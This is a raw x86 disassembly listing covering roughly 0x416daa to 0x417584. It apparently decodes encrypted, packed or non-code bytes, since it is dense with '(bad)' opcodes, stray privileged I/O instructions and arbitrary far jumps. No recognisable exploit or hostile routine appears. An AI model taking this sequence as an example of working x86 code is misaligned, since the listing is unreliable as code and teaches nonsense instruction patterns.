  416daa:	retf   
  416dab:	call   0x2790:0xe4b31a8a
  416db2:	test   eax,0xed8aaed3
  416db7:	in     al,dx
  416db8:	and    bl,al
  416dba:	in     eax,dx
  416dbb:	jmp    0x363a:0xa8838eee
  416dc2:	pop    esi
  416dc3:	popa   
  416dc4:	mov    cs,eax
  416dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dc7:	repz fwait
  416dc9:	mov    ecx,0x31eceb4f
  416dce:	and    bh,0x85
  416dd1:	ss xchg ebx,eax
  416dd3:	pushw  ds
  416dd5:	xlat   BYTE PTR ds:[ebx]
  416dd6:	xchg   ebp,eax
  416dd7:	ror    esi,cl
  416dd9:	lahf   
  416dda:	loope  0x416da4
  416ddc:	xchg   edx,eax
  416ddd:	sar    BYTE PTR [edx+0x7e],1
  416de0:	jp     0x416dac
  416de2:	adc    al,0x7a
  416de4:	mul    DWORD PTR ds:0xa9730b61
  416dea:	lods   eax,DWORD PTR ds:[esi]
  416deb:	enter  0xfab1,0x7d
  416def:	aas    
  416df0:	inc    ebx
  416df1:	jno    0x416e10
  416df3:	hlt    
  416df4:	mov    edi,0x4aec2321
  416df9:	enter  0x57b9,0x46
  416dfd:	loopne 0x416e13
  416dff:	jo     0x416e4d
  416e01:	lock nop
  416e03:	push   ecx
  416e04:	xor    DWORD PTR [edi-0x7ae2a66c],0x7f8ca0cf
  416e0e:	cmp    eax,0xfdb71ef3
  416e13:	mov    edi,0x209e4032
  416e18:	loopne 0x416dc3
  416e1a:	retf   0x3104
  416e1d:	(bad)  
  416e1f:	mov    ss,ebp
  416e21:	fdiv   QWORD PTR [edi]
  416e23:	xor    esp,esp
  416e25:	xchg   esi,eax
  416e26:	test   dl,0x7b
  416e29:	arpl   WORD PTR [ebx+0x271ee4c],ax
  416e2f:	sbb    dh,bl
  416e31:	jbe    0x416dde
  416e33:	retf   
  416e34:	mov    DWORD PTR [edx+0x17b5370f],eax
  416e3a:	add    ch,BYTE PTR [ebx]
  416e3c:	addr16 out 0xc7,al
  416e3f:	outs   dx,DWORD PTR ds:[esi]
  416e40:	or     ecx,DWORD PTR [esi-0x77]
  416e43:	fmul   QWORD PTR [edi-0x56]
  416e46:	pop    esi
  416e47:	cmp    ah,dl
  416e49:	cmp    al,0xad
  416e4b:	hlt    
  416e4c:	popa   
  416e4d:	xchg   esp,eax
  416e4e:	mov    bh,0x86
  416e50:	xchg   ecx,eax
  416e51:	mov    ds:0xb3c2bdfc,al
  416e56:	push   eax
  416e57:	sahf   
  416e58:	xor    BYTE PTR [edx-0x57],bh
  416e5b:	fsubr  QWORD PTR [edx]
  416e5d:	fidivr DWORD PTR [ebx-0x5d22c7a6]
  416e63:	mov    ecx,0x22a64905
  416e68:	cmp    DWORD PTR [ebx],0x4187bbb5
  416e6e:	dec    edx
  416e6f:	pop    ds
  416e70:	jo     0x416e76
  416e72:	mov    eax,0x94e3f74a
  416e77:	mov    al,ds:0xee66ef11
  416e7c:	mov    ebp,DWORD PTR [eax]
  416e7e:	lock jmp 0x5517:0xc4e0532
  416e86:	add    al,0x59
  416e88:	adc    edx,DWORD PTR [ebx]
  416e8a:	sub    DWORD PTR [ecx+0x30fe0140],ebx
  416e90:	test   BYTE PTR [edx+0x3b],bl
  416e93:	pop    esi
  416e94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e95:	jge    0x416ef2
  416e97:	test   BYTE PTR [eax],cl
  416e99:	and    BYTE PTR [edx],ch
  416e9b:	mov    DWORD PTR [edx],eax
  416e9d:	cdq    
  416e9e:	shld   DWORD PTR [edx],edi,cl
  416ea1:	push   ebx
  416ea2:	xchg   DWORD PTR [ecx+0x2c],esi
  416ea5:	std    
  416ea6:	out    dx,eax
  416ea7:	mov    esi,edi
  416ea9:	ins    DWORD PTR es:[edi],dx
  416eaa:	mov    ds:0x7972df38,eax
  416eaf:	xchg   edi,eax
  416eb0:	sub    edi,DWORD PTR [esi+0x43]
  416eb3:	ror    DWORD PTR [ebp+0x3e3beab9],0x47
  416eba:	out    0x81,eax
  416ebc:	push   edi
  416ebd:	add    dl,dl
  416ebf:	in     al,0x43
  416ec1:	pop    esi
  416ec2:	(bad)  
  416ec3:	push   cs
  416ec4:	pop    ss
  416ec5:	sar    eax,0x85
  416ec8:	and    BYTE PTR [ebp+0x7c95b15c],dl
  416ece:	and    eax,0xcba7d315
  416ed3:	adc    edi,DWORD PTR [edi+esi*4-0x74b4f4fa]
  416eda:	pop    edi
  416edb:	dec    eax
  416edc:	rcl    al,cl
  416ede:	xchg   esp,eax
  416edf:	pop    ds
  416ee0:	pop    ds
  416ee1:	xchg   ebx,eax
  416ee2:	int3   
  416ee3:	mov    bh,0xb0
  416ee5:	or     al,0x7e
  416ee7:	pop    ecx
  416ee8:	lods   eax,DWORD PTR ds:[esi]
  416ee9:	sbb    ah,BYTE PTR [ecx-0x2]
  416eec:	shr    BYTE PTR [eax+edx*8],cl
  416eef:	adc    cl,BYTE PTR [ebp-0x73394bba]
  416ef5:	lods   eax,DWORD PTR ds:[esi]
  416ef6:	push   0x6b
  416ef8:	add    edx,DWORD PTR [eax-0x48607e0d]
  416efe:	inc    ebp
  416eff:	cmp    DWORD PTR [ebp+0x3265001c],0x45c1f2f6
  416f09:	mov    ecx,0xb8933ece
  416f0e:	mov    esi,0x9cf28808
  416f13:	push   0x2c
  416f15:	cmp    bh,BYTE PTR [eax-0x7d00df02]
  416f1b:	pusha  
  416f1c:	(bad)  
  416f1d:	mov    es,WORD PTR [ecx]
  416f1f:	ins    BYTE PTR es:[edi],dx
  416f20:	in     eax,0x25
  416f22:	and    edx,DWORD PTR [ecx]
  416f24:	jnp    0x416ee0
  416f26:	lds    esp,FWORD PTR [eax+0x32fee25b]
  416f2c:	xchg   ebx,eax
  416f2d:	repnz lea ebx,[edx]
  416f30:	pop    ebp
  416f31:	inc    edx
  416f32:	and    ebx,DWORD PTR [ebp+0x14]
  416f35:	mov    esi,0x4ed07768
  416f3a:	dec    WORD PTR [ebx]
  416f3d:	out    dx,al
  416f3e:	clc    
  416f3f:	jge    0x416f99
  416f41:	sub    al,0xb4
  416f43:	stc    
  416f44:	dec    ebp
  416f45:	pop    eax
  416f46:	rcl    DWORD PTR [edi-0x47],0xe3
  416f4a:	push   esi
  416f4b:	mov    bl,0xf
  416f4d:	push   cs
  416f4e:	pop    ss
  416f4f:	loope  0x416f8a
  416f51:	fidiv  DWORD PTR [edx+eiz*4]
  416f54:	faddp  st(7),st
  416f56:	add    eax,0xc7987611
  416f5b:	mov    dh,0x25
  416f5d:	in     al,dx
  416f5e:	ins    BYTE PTR es:[edi],dx
  416f5f:	mov    ecx,0xe030f449
  416f64:	xor    eax,0x49721117
  416f69:	jno    0x416fc0
  416f6b:	pop    esi
  416f6c:	adc    BYTE PTR [ebx-0x76],bl
  416f6f:	and    bh,BYTE PTR [ebp+0x15]
  416f72:	sbb    al,0xbd
  416f74:	jno    0x416f71
  416f76:	jb     0x416f63
  416f78:	xlat   BYTE PTR ds:[ebx]
  416f79:	xchg   ebp,eax
  416f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f7c:	fst    DWORD PTR [esi*4-0x37d25c08]
  416f83:	lods   eax,DWORD PTR ds:[esi]
  416f84:	dec    edx
  416f85:	dec    esp
  416f86:	pop    edi
  416f87:	shr    bh,1
  416f89:	jmp    0xc69f:0x507dd1b7
  416f90:	(bad)  ds:0x4055d81d
  416f96:	cmp    ecx,DWORD PTR [edi+0x72528962]
  416f9c:	icebp  
  416f9d:	add    esi,DWORD PTR [ebx]
  416f9f:	cdq    
  416fa0:	fs es jb 0x416ff1
  416fa4:	fadd   DWORD PTR [edx+0x2]
  416fa7:	sbb    BYTE PTR [ebx],bh
  416fa9:	cld    
  416faa:	adc    DWORD PTR ss:[edx-0x21],ebp
  416fae:	and    bh,dh
  416fb0:	or     BYTE PTR [eax-0x43],al
  416fb3:	test   al,0x8f
  416fb5:	and    BYTE PTR [eax-0x37374a04],bl
  416fbb:	inc    ebx
  416fbc:	cmp    DWORD PTR ds:0x5c538ce7,0xe18ceb7a
  416fc6:	loope  0x416fbc
  416fc8:	sub    DWORD PTR [esi],ecx
  416fca:	xor    dh,bh
  416fcc:	pop    eax
  416fcd:	mov    eax,ds:0x31326965
  416fd2:	and    dh,0x11
  416fd5:	scas   eax,DWORD PTR es:[edi]
  416fd6:	adc    eax,0xad8982fa
  416fdb:	loope  0x416fb8
  416fdd:	mov    eax,ds:0x4059def
  416fe2:	push   ds
  416fe3:	fdiv   QWORD PTR [esi]
  416fe5:	pop    edi
  416fe6:	push   esp
  416fe7:	aas    
  416fe8:	daa    
  416fe9:	les    ecx,FWORD PTR [ebx]
  416feb:	dec    ebx
  416fec:	punpckhwd mm7,QWORD PTR [edx+0x77]
  416ff0:	aaa    
  416ff1:	push   es
  416ff2:	loopne 0x417036
  416ff4:	mov    ch,0x94
  416ff6:	push   edi
  416ff7:	scas   eax,DWORD PTR es:[edi]
  416ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ff9:	add    DWORD PTR [esi+0x64],esi
  416ffc:	rcr    cl,0xad
  416fff:	not    DWORD PTR [ebx+0x234956c8]
  417005:	mov    eax,ds:0xa99f1cd3
  41700a:	test   eax,eax
  41700c:	clc    
  41700d:	fild   DWORD PTR [esi-0x5]
  417010:	push   edi
  417011:	test   DWORD PTR [ebx+ebp*1+0x458fa1fe],edi
  417018:	arpl   WORD PTR [ebx+0x5a],bp
  41701b:	inc    eax
  41701c:	cmp    DWORD PTR [edi+0x14],ebp
  41701f:	es adc eax,0x589d4934
  417025:	inc    DWORD PTR [eax+0x4d]
  417028:	(bad)  
  417029:	into   
  41702a:	shr    BYTE PTR [esi+0x5b],1
  41702d:	sbb    bl,BYTE PTR [ecx-0x52917a5c]
  417033:	cli    
  417034:	nop
  417035:	lds    ebx,FWORD PTR [eax-0x196c9ec3]
  41703b:	mov    bh,0xf3
  41703d:	(bad)  
  41703e:	dec    esi
  41703f:	jecxz  0x417031
  417041:	xchg   ebp,eax
  417042:	out    dx,al
  417043:	adc    DWORD PTR [edi-0x6766d2db],0xffffffb5
  41704a:	imul   edi,DWORD PTR [eax],0x8fe0a886
  417050:	popf   
  417051:	mov    bh,0x4c
  417053:	xchg   esp,eax
  417054:	or     bh,BYTE PTR [edi]
  417056:	xchg   ebx,eax
  417057:	push   eax
  417058:	iret   
  417059:	inc    eax
  41705a:	aam    0x7f
  41705c:	ja     0x41703f
  41705e:	shl    DWORD PTR [edi+0x12ceb73a],0x4f
  417065:	mov    BYTE PTR [ecx],al
  417067:	dec    ebp
  417068:	push   es
  417069:	lea    esi,[ebx+0x16]
  41706c:	inc    edx
  41706d:	push   0x72a63e8a
  417072:	outs   dx,BYTE PTR ds:[esi]
  417073:	stc    
  417074:	push   ebp
  417075:	mul    BYTE PTR [ebp+0x4e]
  417078:	jge    0x4170dd
  41707a:	les    edi,FWORD PTR [esi]
  41707c:	pop    edx
  41707d:	daa    
  41707e:	dec    esi
  41707f:	(bad)  
  417080:	scas   al,BYTE PTR es:[edi]
  417081:	dec    esi
  417082:	in     eax,0xb9
  417084:	sub    bl,BYTE PTR [ebp+0x4c1b2c26]
  41708a:	scas   al,BYTE PTR es:[edi]
  41708b:	out    dx,al
  41708c:	inc    esp
  41708d:	xchg   esi,eax
  41708e:	inc    edx
  41708f:	pop    es
  417090:	mov    esp,0xdb718d58
  417095:	loope  0x4170f7
  417097:	or     BYTE PTR [edx+0x67],0x5a
  41709b:	jae    0x41708d
  41709d:	into   
  41709e:	cli    
  41709f:	lods   al,BYTE PTR ds:[esi]
  4170a0:	sub    al,0x6c
  4170a2:	faddp  st(1),st
  4170a4:	push   ds
  4170a5:	icebp  
  4170a6:	cmp    ecx,DWORD PTR [esi]
  4170a8:	in     al,dx
  4170a9:	lods   al,BYTE PTR ds:[esi]
  4170aa:	add    DWORD PTR [edi+0x1a5a14c6],esp
  4170b0:	out    0x83,eax
  4170b2:	xchg   esp,eax
  4170b3:	stos   BYTE PTR es:[edi],al
  4170b4:	js     0x417117
  4170b6:	cmp    BYTE PTR [ebx+0x76],cl
  4170b9:	adc    ebp,DWORD PTR [edx-0x1c6b2e65]
  4170bf:	jns    0x4170e2
  4170c1:	sbb    BYTE PTR [ebp+0x66c3932a],ah
  4170c7:	lods   al,BYTE PTR ds:[esi]
  4170c8:	hlt    
  4170c9:	jnp    0x417149
  4170cb:	call   0x9d54:0xfed4009
  4170d2:	cmp    edi,DWORD PTR [esi]
  4170d4:	mov    al,ds:0x2b14b300
  4170d9:	push   0xcace59d
  4170de:	jp     0x41710b
  4170e0:	mov    ds:0x34513b05,eax
  4170e5:	ss call 0xbca6ff2
  4170eb:	nop
  4170ec:	pop    ebp
  4170ed:	pop    ss
  4170ee:	add    al,0x43
  4170f0:	or     bl,BYTE PTR [ecx+0x34]
  4170f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170f4:	sub    al,0xa
  4170f6:	pop    ebx
  4170f7:	adc    eax,DWORD PTR [ebp-0x76]
  4170fa:	add    dh,BYTE PTR [ebx+0x40390e0f]
  417100:	xor    dh,BYTE PTR [eax]
  417102:	mov    WORD PTR [ebx],?
  417104:	pop    esp
  417105:	sub    al,0x15
  417107:	sbb    cl,BYTE PTR [ebp+0x3e]
  41710a:	dec    ebx
  41710b:	daa    
  41710c:	aas    
  41710d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41710e:	(bad)  
  41710f:	fmul   DWORD PTR [edi+0x3af9b755]
  417115:	pop    ecx
  417116:	in     al,dx
  417117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417118:	pop    esp
  417119:	dec    esi
  41711a:	push   ebp
  41711b:	xor    al,0x4c
  41711d:	or     DWORD PTR [edi+0x3b],esi
  417120:	xchg   BYTE PTR [ebp-0x5012d8a5],ah
  417126:	xor    BYTE PTR [edx+0x5276c5cb],0xca
  41712d:	leave  
  41712e:	or     DWORD PTR [edx+0x5b],0x8c428911
  417135:	(bad)  
  417136:	ins    DWORD PTR es:[edi],dx
  417137:	(bad)  
  417138:	fist   DWORD PTR [edi]
  41713a:	ret    0x9c8b
  41713d:	retf   
  41713e:	adc    BYTE PTR [eax+ecx*8+0x2a938d6c],bl
  417145:	jg     0x4171c3
  417147:	fwait
  417148:	ja     0x417138
  41714a:	pop    ds
  41714b:	pop    es
  41714c:	pop    eax
  41714d:	loop   0x417163
  41714f:	(bad)  
  417150:	je     0x41712b
  417152:	outs   dx,BYTE PTR ds:[esi]
  417153:	xor    DWORD PTR [ecx],edi
  417155:	rol    cl,1
  417157:	sub    DWORD PTR [ebp-0x11462154],eax
  41715d:	push   es
  41715e:	jno    0x4171a4
  417160:	inc    DWORD PTR [edx+0x11ba2aa5]
  417166:	and    al,0x67
  417168:	fsubr  DWORD PTR ds:0xa9548e66
  41716e:	leave  
  41716f:	cmp    ch,cl
  417171:	inc    edi
  417172:	imul   ebp,DWORD PTR [esi],0xc382ed75
  417178:	or     esi,edx
  41717a:	jge    0x4171ae
  41717c:	cmp    DWORD PTR [ebx-0x42],esp
  41717f:	pushf  
  417180:	xchg   esp,eax
  417181:	push   ss
  417182:	iret   
  417183:	sub    DWORD PTR [esp+eax*2+0x6052e74],edx
  41718a:	dec    ecx
  41718b:	cld    
  41718c:	or     eax,0xef122909
  417191:	jbe    0x4171c3
  417193:	xchg   ecx,eax
  417194:	fld    TBYTE PTR [ecx-0x31]
  417197:	inc    ebx
  417198:	dec    esp
  417199:	mov    eax,0x90d86653
  41719e:	push   es
  41719f:	mov    ebp,0x3a8a05a8
  4171a4:	cwde   
  4171a5:	xor    ebp,esi
  4171a7:	imul   esp,DWORD PTR [esi+0x7],0x18
  4171ab:	pop    bp
  4171ad:	push   esi
  4171ae:	mov    dh,0x99
  4171b0:	loop   0x41720a
  4171b2:	in     eax,dx
  4171b3:	nop
  4171b4:	lock nop
  4171b6:	cmp    eax,DWORD PTR [eax+0x5339c32d]
  4171bc:	test   DWORD PTR [edx+0x75],edi
  4171bf:	loope  0x4171b5
  4171c1:	cs cmp al,0x4f
  4171c4:	cmp    eax,0x6781265d
  4171c9:	xchg   ebx,eax
  4171ca:	test   eax,0x90b54cbd
  4171cf:	xlat   BYTE PTR ds:[ebx]
  4171d0:	imul   ebx,DWORD PTR [ebp-0x4a27ba87],0xffffffcc
  4171d7:	lahf   
  4171d8:	and    eax,0x3a3db49e
  4171dd:	dec    edi
  4171de:	xchg   esi,eax
  4171df:	jbe    0x417246
  4171e1:	in     al,0x25
  4171e3:	fidivr WORD PTR [edi-0x1d20cbcf]
  4171e9:	neg    BYTE PTR [ecx-0x75]
  4171ec:	call   esp
  4171ee:	mov    al,0xef
  4171f0:	adc    DWORD PTR [ebp+0x7f],ecx
  4171f3:	or     eax,DWORD PTR [edi-0x75a9d402]
  4171f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171fa:	xor    BYTE PTR [ebx-0x3e18226f],bl
  417200:	xor    bh,BYTE PTR [eax+0x6ecb69f9]
  417206:	test   eax,0xc91af922
  41720b:	sbb    esp,DWORD PTR [ecx]
  41720d:	jae    0x41728c
  41720f:	xor    bl,dh
  417211:	cli    
  417212:	or     ebp,esp
  417214:	sbb    esi,edx
  417216:	sub    al,0xd5
  417218:	sub    al,0x6c
  41721a:	jg     0x4171ae
  41721c:	and    BYTE PTR [edx-0x463c2f4],bl
  417222:	mov    ebx,0x4ad8b6ab
  417227:	push   ebp
  417228:	gs (bad) 
  41722a:	mov    ch,0x17
  41722c:	imul   esi,edi,0x5a099a2
  417232:	mov    dh,0x66
  417234:	mov    edi,DWORD PTR [ebx]
  417236:	repnz (bad) 
  417238:	cdq    
  417239:	fstp   DWORD PTR [ebp-0x6]
  41723c:	lock push ss
  41723e:	enter  0x5598,0x78
  417242:	daa    
  417243:	gs test al,0x3a
  417246:	push   cs
  417247:	ds dec ebp
  417249:	sub    DWORD PTR [ebx],0xffffffed
  41724c:	repz sahf 
  41724e:	daa    
  41724f:	fs pop eax
  417251:	xlat   BYTE PTR ds:[ebx]
  417252:	arpl   WORD PTR [ecx-0x781ee32c],cx
  417258:	ja     0x4172d2
  41725a:	mov    bh,0x2d
  41725c:	loopne 0x41721f
  41725e:	pop    ecx
  41725f:	(bad)  
  417260:	sub    eax,0xdcb5dc65
  417265:	dec    eax
  417266:	sbb    BYTE PTR [edx],ah
  417268:	ret    
  417269:	jno    0x417287
  41726b:	cld    
  41726c:	pop    ds
  41726d:	rcr    BYTE PTR [ebp-0xa],1
  417270:	xchg   edi,eax
  417271:	adc    eax,0xe697d1a5
  417276:	call   0x7e83:0x3688a52f
  41727d:	out    dx,al
  41727e:	je     0x417239
  417280:	mov    edx,0xf67d6690
  417285:	xchg   edx,eax
  417286:	outs   dx,DWORD PTR ds:[esi]
  417287:	inc    edx
  417288:	imul   esp,DWORD PTR [edi],0xff382421
  41728e:	imul   ecx,eax,0x89e27556
  417294:	cli    
  417295:	xchg   edx,eax
  417296:	or     al,0x96
  417298:	or     eax,0x721d686b
  41729d:	test   al,0x59
  41729f:	fistp  WORD PTR ss:[esi+0x4]
  4172a3:	inc    eax
  4172a4:	push   eax
  4172a5:	xchg   ebx,eax
  4172a6:	(bad)  [edx+0x80d6739]
  4172ac:	daa    
  4172ad:	mov    ds:0xd21acbb3,al
  4172b2:	arpl   ax,ax
  4172b4:	mov    edx,0x66814d88
  4172b9:	cdq    
  4172ba:	mov    WORD PTR ds:0x6c94017f,ss
  4172c0:	(bad)  
  4172c1:	mov    ecx,0x145190f9
  4172c6:	mov    eax,0x177b8b4a
  4172cb:	add    ch,al
  4172cd:	adc    edi,DWORD PTR [edx+0x53499301]
  4172d3:	mov    ebx,DWORD PTR [edi+eiz*1+0x4]
  4172d7:	or     BYTE PTR [ebx],ch
  4172d9:	out    0x11,al
  4172db:	dec    edi
  4172dc:	mov    dl,0xe6
  4172de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172df:	pop    ss
  4172e0:	test   DWORD PTR [edi-0x72],0x272abee6
  4172e7:	aad    0x38
  4172e9:	popa   
  4172ea:	jge    0x41727e
  4172ec:	xor    eax,0xbc3f58a5
  4172f1:	and    bl,BYTE PTR [edx+0x49]
  4172f4:	sub    cl,bl
  4172f6:	push   es
  4172f7:	dec    ebx
  4172f8:	pop    edx
  4172f9:	enter  0xf643,0x0
  4172fd:	aam    0x51
  4172ff:	retf   0xf82e
  417302:	mov    DWORD PTR [ecx+ebp*2+0x21814d94],ebp
  417309:	mov    ebp,0xa993f0b3
  41730e:	adc    dh,BYTE PTR [esi+0x2e]
  417311:	or     ch,ah
  417313:	sbb    eax,DWORD PTR [ecx+0x1d]
  417316:	or     DWORD PTR ds:0xafff0864,edx
  41731c:	(bad)  
  41731e:	jmp    0x8ec8ee
  417323:	xor    DWORD PTR [ecx+edi*8-0x3c],ebp
  417327:	clc    
  417328:	sti    
  417329:	test   BYTE PTR [ebx],ch
  41732b:	sub    dl,bh
  41732d:	(bad)
  417330:	sbb    DWORD PTR [esi],esi
  417332:	pop    edx
  417333:	(bad)  
  417335:	loop   0x417388
  417337:	and    eax,0xa8225208
  41733c:	ja     0x417346
  41733e:	shr    BYTE PTR [edi+0x28e946a3],cl
  417344:	retf   
  417345:	retf   
  417346:	fisttp QWORD PTR [ebx+0x57]
  417349:	scas   al,BYTE PTR es:[edi]
  41734a:	cdq    
  41734b:	ds pop ecx
  41734d:	sub    ch,BYTE PTR ds:0xe901635d
  417353:	test   al,0x41
  417355:	clc    
  417356:	pop    edx
  417357:	jp     0x4173c0
  417359:	loop   0x41734f
  41735b:	mov    al,0xc1
  41735d:	mov    esp,0x9bd14767
  417362:	dec    ebx
  417363:	and    BYTE PTR [edi+ecx*8+0x2cd4987b],al
  41736a:	fs or  eax,0x673749fc
  417370:	aaa    
  417371:	push   eax
  417372:	fld1   
  417374:	retf   0x27b5
  417377:	inc    esi
  417378:	stc    
  417379:	xchg   esp,eax
  41737a:	imul   esp,DWORD PTR [eax-0x325bedd8],0x61
  417381:	rol    DWORD PTR ds:0x87bce8e3,1
  417387:	jno    0x417361
  417389:	loopne 0x417368
  41738b:	pop    esp
  41738c:	push   0xfffffff7
  41738e:	jb     0x417329
  417390:	jne    0x417409
  417392:	test   al,0x9f
  417394:	aad    0xd8
  417396:	repnz xchg edi,eax
  417398:	pop    ss
  417399:	call   0xfbba12b8
  41739e:	or     BYTE PTR [esp+edi*1],dh
  4173a1:	sbb    bh,BYTE PTR [edx+0x3b]
  4173a4:	pop    esi
  4173a5:	cs jne 0x417349
  4173a8:	mov    eax,ds:0xb6213c7c
  4173ad:	out    0xf1,eax
  4173af:	jo     0x4173d3
  4173b1:	mov    dh,BYTE PTR [ebp*2-0x376255c2]
  4173b8:	xchg   esp,eax
  4173b9:	not    DWORD PTR [ebp-0x72541e48]
  4173bf:	clc    
  4173c0:	adc    al,0x59
  4173c2:	call   0xe66908fc
  4173c7:	fld    DWORD PTR [ebx+0x432fac1b]
  4173cd:	dec    esi
  4173ce:	imul   edi,DWORD PTR ds:0xa20d7b6c,0x2d9cb685
  4173d8:	mov    ebp,0x811f89b0
  4173dd:	(bad)  
  4173de:	mov    ah,0x56
  4173e0:	hlt    
  4173e1:	aas    
  4173e2:	retf   0x8f5
  4173e5:	ja     0x417442
  4173e7:	and    DWORD PTR [ecx],edx
  4173e9:	jns    0x417390
  4173eb:	test   ebp,eax
  4173ed:	or     ax,WORD PTR [edi-0x64]
  4173f1:	push   ecx
  4173f2:	sbb    ebx,ecx
  4173f4:	jmp    0x41746a
  4173f6:	enter  0xe842,0xf0
  4173fa:	hlt    
  4173fb:	fadd   QWORD PTR [ebp+0x22]
  4173fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173ff:	inc    esi
  417400:	add    DWORD PTR ds:[edx-0x7430f2b],ebp
  417407:	push   ebx
  417408:	pop    es
  417409:	call   0x3dd56790
  41740e:	pop    ds
  41740f:	sub    eax,0x258d773e
  417414:	or     DWORD PTR [eax],edx
  417416:	mov    dh,0x22
  417418:	mov    ds:0xfaa7c3cb,eax
  41741d:	je     0x417460
  41741f:	leave  
  417420:	xor    BYTE PTR [ebx],ch
  417422:	icebp  
  417423:	jnp    0x417490
  417425:	fistp  WORD PTR [eax-0x44]
  417428:	imul   esp,DWORD PTR [esi+0xb],0x71
  41742c:	add    eax,0xa041ea14
  417431:	mov    ds:0x424d4e50,eax
  417436:	pusha  
  417437:	aad    0x7
  417439:	push   0x96ad64d2
  41743e:	mov    bl,0x17
  417440:	(bad)  
  417441:	js     0x4173d3
  417443:	mov    edx,0x155d9540
  417448:	mov    bh,0xae
  41744a:	rol    DWORD PTR [ebp+0x6b027d4f],0xb7
  417451:	push   eax
  417452:	out    dx,al
  417453:	mov    eax,0x1a507b19
  417458:	out    dx,al
  417459:	dec    esi
  41745a:	hlt    
  41745b:	pop    edx
  41745c:	dec    edi
  41745d:	xor    DWORD PTR [ebx+esi*2-0x7f],0xab9d6937
  417465:	jne    0x417404
  417467:	lahf   
  417468:	pop    eax
  417469:	jo     0x41741f
  41746b:	aad    0x73
  41746d:	dec    edx
  41746e:	or     eax,0x8e56f7d5
  417473:	loop   0x4174b1
  417475:	ror    BYTE PTR [ebx-0x4175dabb],0x1a
  41747c:	jle    0x41744d
  41747e:	int3   
  41747f:	pushf  
  417480:	pop    eax
  417481:	ins    BYTE PTR es:[edi],dx
  417482:	ja     0x4174b5
  417484:	repnz mov edi,0xd86a2367
  41748a:	(bad)  
  41748b:	imul   esi,DWORD PTR [ebp+0x14],0xffffff8e
  41748f:	pop    ebx
  417490:	mov    ebp,ebx
  417492:	sbb    bl,BYTE PTR [edx*4-0x3a0de26c]
  417499:	ja     0x417467
  41749b:	jne    0x4174e4
  41749d:	mov    dh,0x16
  41749f:	shr    DWORD PTR [esp+esi*1-0x39],1
  4174a3:	inc    ebx
  4174a4:	ja     0x41747c
  4174a6:	repz xor DWORD PTR [ecx],0xffffff92
  4174aa:	sbb    eax,0x345fc079
  4174af:	mov    BYTE PTR [edi],al
  4174b1:	hlt    
  4174b2:	mov    ah,0x68
  4174b4:	data16 jo 0x417508
  4174b7:	cwde   
  4174b8:	inc    edx
  4174b9:	add    esi,DWORD PTR [esi]
  4174bb:	mov    ch,0xf1
  4174bd:	cld    
  4174be:	pop    ecx
  4174bf:	dec    edx
  4174c0:	shr    DWORD PTR [ecx],0xa4
  4174c3:	cs cwde 
  4174c5:	ins    BYTE PTR es:[edi],dx
  4174c6:	imul   ecx,DWORD PTR [eax+0x6c],0x6b
  4174ca:	add    al,0xdc
  4174cc:	mov    al,BYTE PTR [ecx+esi*4+0x76]
  4174d0:	enter  0x5630,0x6d
  4174d4:	fild   WORD PTR [ebx-0x42a9b9e5]
  4174da:	dec    esp
  4174db:	test   DWORD PTR [edx],ebp
  4174dd:	pop    esp
  4174de:	sti    
  4174df:	iret   
  4174e0:	outs   dx,BYTE PTR ds:[esi]
  4174e1:	out    dx,al
  4174e2:	inc    esi
  4174e3:	and    ah,cl
  4174e5:	sub    eax,0x13d85700
  4174ea:	inc    edi
  4174eb:	sbb    bh,ah
  4174ed:	inc    edi
  4174ee:	xchg   DWORD PTR ds:0xbc50e91f,ebx
  4174f4:	aam    0x9c
  4174f6:	shl    edx,0xfc
  4174f9:	pop    ss
  4174fa:	test   cl,dl
  4174fc:	pop    ebx
  4174fd:	add    BYTE PTR [ecx-0x59e67cca],0xee
  417504:	dec    edi
  417505:	and    esp,0xf7af47bc
  41750b:	psraw  mm2,QWORD PTR [edi]
  41750e:	stos   DWORD PTR es:[edi],eax
  41750f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417510:	push   edi
  417511:	xor    al,0xb6
  417513:	sbb    BYTE PTR [edx],dl
  417515:	test   BYTE PTR [esp+ecx*8+0x3f],bh
  417519:	leave  
  41751a:	mov    dh,0x2
  41751c:	test   dl,0x81
  41751f:	push   esi
  417520:	sub    BYTE PTR [esi],ch
  417522:	arpl   bx,ax
  417524:	fyl2x  
  417526:	mov    BYTE PTR [ebp+0x70],ah
  417529:	inc    eax
  41752a:	cdq    
  41752b:	push   esp
  41752c:	scas   al,BYTE PTR es:[edi]
  41752d:	add    ch,BYTE PTR [ebx]
  41752f:	cs test al,0x83
  417532:	aas    
  417533:	add    BYTE PTR [ecx],bl
  417535:	int3   
  417536:	adc    DWORD PTR [ebp+ecx*8-0x41],ebp
  41753a:	sub    BYTE PTR [esp+ebx*4+0x4a6aa2fe],bl
  417541:	jne    0x417599
  417543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417544:	mov    ecx,DWORD PTR [esi+0x55b4f26e]
  41754a:	adc    DWORD PTR [ecx+0x2dde2781],edi
  417550:	loop   0x4175a9
  417552:	jp     0x417597
  417554:	in     al,dx
  417555:	sub    BYTE PTR [edi],0xc3
  417558:	out    dx,al
  417559:	popa   
  41755a:	call   0xd710727c
  41755f:	sahf   
  417560:	fmul   DWORD PTR [edi-0x69]
  417563:	imul   ebx,ebp,0xffffffcd
  417566:	arpl   WORD PTR [edx],cx
  417568:	(bad)  
  417569:	bound  esi,QWORD PTR [ebp+0x6]
  41756c:	push   edx
  41756d:	cmc    
  41756e:	rol    BYTE PTR [edx+0x44],cl
  417571:	cli    
  417572:	fiadd  DWORD PTR [edx+0x77caf645]
  417578:	repz push ebp
  41757a:	mov    dh,0x1
  41757c:	mov    esi,0x343b1a0c
  417581:	add    ecx,edx
  417583:	pusha  
  417584:	fsubr  QWORD PTR [eax-0x44f6096c]
